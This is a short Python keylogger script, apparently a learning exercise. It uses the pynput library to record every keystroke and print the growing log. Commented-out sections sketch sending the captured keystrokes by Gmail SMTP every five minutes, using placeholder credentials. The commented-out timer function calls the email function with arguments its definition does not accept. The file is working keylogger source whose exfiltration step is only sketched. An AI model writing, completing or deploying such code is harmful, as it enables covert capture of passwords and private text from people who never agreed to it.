import pynput.keyboard
#import smtplib
#import threading
#from pynput import keyboard


log = ""
def callback_func(key):
    global log
#print(type(key))
    try:
        #log = log.encode() + key.char.encode("utf-8")
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
#SENDING EMAILS WITH PYTHON
#def send_email():
#    email_server = smtplib.SMTP("smtp.gmail.com",587)
#    email_server.starttls()
#    email_server.login("emai.l@email.com","password")
#    email_server.sendmail("emai.l@email","emai.l@email" ,"msg")
#    email_server.quit()

#send_email()

#thread func
#def thread_function():
#    global log
#    send_email("","",log)
#    log = ""
#   timer.object = threading.Timer(300,thread_function)

keyLogger_listener = pynput.keyboard.Listener(on_press=callback_func)

#threading | writing variable to other processes | handling multiple processes
with keyLogger_listener:
    keyLogger_listener.join()